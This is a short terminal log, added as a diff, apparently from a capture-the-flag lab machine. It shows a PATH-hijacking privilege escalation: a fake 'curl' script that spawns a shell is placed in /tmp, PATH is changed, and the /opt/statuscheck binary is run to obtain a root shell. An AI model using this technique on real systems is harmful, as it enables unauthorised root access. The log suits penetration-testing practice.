@@ -1,0 +1,18 @@
+helios@symfonos:/opt$ echo '#!/bin/sh' > /tmp/curl 
+echo '#!/bin/sh' > /tmp/curl                                                                                                         
+helios@symfonos:/opt$ echo '/bin/sh' >> /tmp/curl                                                                                    
+echo '/bin/sh' >> /tmp/curl                                                                                                          
+helios@symfonos:/opt$ chmod +x /tmp/curl                                                                                             
+chmod +x /tmp/curl                                                                                                                   
+helios@symfonos:/opt$ which curl                                                                                                     
+which curl                                                                                                                           
+/usr/bin/curl                                                                                                                        
+helios@symfonos:/opt$ export PATH=/tmp:$PATH                                                                                         
+export PATH=/tmp:$PATH                                                                                                               
+helios@symfonos:/opt$ /opt/statuscheck
+/opt/statuscheck
+# whoami
+whoami
+root
+# 
+
